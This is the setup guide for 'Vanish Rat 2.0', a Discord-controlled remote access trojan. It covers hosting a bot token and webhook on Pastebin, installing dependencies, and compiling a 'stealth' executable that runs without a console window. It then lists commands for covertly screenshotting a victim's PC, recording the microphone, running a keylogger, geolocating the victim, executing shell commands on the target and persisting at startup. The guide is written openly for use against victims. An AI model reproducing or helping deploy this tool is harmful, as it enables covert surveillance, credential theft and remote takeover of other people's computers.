
             Vanish Rat 2.0 - Setup Guide
--------------------------------------------------------
Author  : @kqco | Packaged By: #kqco
License : MIT
--------------------------------------------------------

 WHAT YOU NEED
----------------
1. Python 3.11+ Installed
2. A Discord Bot Token (https://discord.com/developers/applications)
3. A Discord Webhook URL (Discord Channel > Integrations > Webhooks)
4. Pastebin or Gist account for hosting config


 SETUP INSTRUCTIONS
---------------------
1. Create a Pastebin/Gist with:
   Line 1: Your Discord Bot Token
   Line 2: Your Discord Webhook URL

2. Make sure it's RAW viewable (Unlisted or Public)

3. Copy the RAW link and paste it into Rat.py:
   Example:
   config_url = "https://pastebin.com/raw/YourPasteID"

4. Install the required packages:
   pip install -r requirements.txt
   OR manually install:
   pip install discord requests pypiwin32 pycaw comtypes opencv-python numpy sounddevice scipy pyautogui pynput cryptography pycryptodome pillow aiofiles pyttsx3

5. Run the bot:
   python Rat.pyw


 OPTIONAL: BUILDING STEALTH EXE
---------------------------------
For No Console Window:
- Nuitka: pip install nuitka
  nuitka --onefile --windows-disable-console Rat.py

- OR PyInstaller: pip install pyinstaller
  pyinstaller --onefile --noconsole Rat.py


DISCORD COMMAND PANEL
---------------------------
Once bot is running, type:
   .help
To view available commands.

Example Commands:
 - .ss        - Screenshot victim's PC
 - .mic       - Record 15 seconds of mic audio
 - .key start - Start keylogger
 - .geo       - Get public IP and location
 - .shell     - Run CMD commands on target machine
 - .stup      - Add bot to startup
 - .exit      - Disconnect bot


 TROUBLESHOOTING
-------------------
- Check bot token and webhook are valid and accessible
- Ensure all packages are installed
- Make sure you used a RAW Pastebin/Gist link
- Run via python, not by double-clicking


ENJOY USING VANISH RAT 2.0 

--------------------------------------------------------

